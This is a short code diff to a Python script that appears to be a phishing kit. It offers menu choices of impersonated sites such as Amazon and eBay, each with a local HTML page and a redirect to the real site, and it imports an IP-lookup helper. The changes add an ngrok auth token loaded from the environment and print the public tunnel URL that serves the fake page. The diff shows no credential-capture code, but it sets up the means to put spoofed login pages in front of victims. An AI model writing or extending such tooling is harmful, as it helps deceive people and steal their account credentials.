@@ -1,5 +1,11 @@
 from utils import print_welcome_message, get_ip_info
+from dotenv import load_dotenv
 import ngrok
+import os
+
+
+load_dotenv()
+
 
 sites = {
     "1": {"name": "Amazon", "html": "amazon/amazon.html", "redirect": "https://amazon.com"},
@@ -12,6 +18,7 @@ sites = {
 }
 
 def start_ngrok():
+    ngrok.set_auth_token(os.getenv("NGROK_AUTHTOKEN"))
     ngrok_tunnel = ngrok.connect('8000')
     return ngrok_tunnel.public_url
 
@@ -30,6 +37,7 @@ def main():
 
     if choice == "1":
         print("you choose Amazon")
+        print(start_ngrok())
     elif choice == "2":
         print("you choose Ebay")
     elif choice == "3":
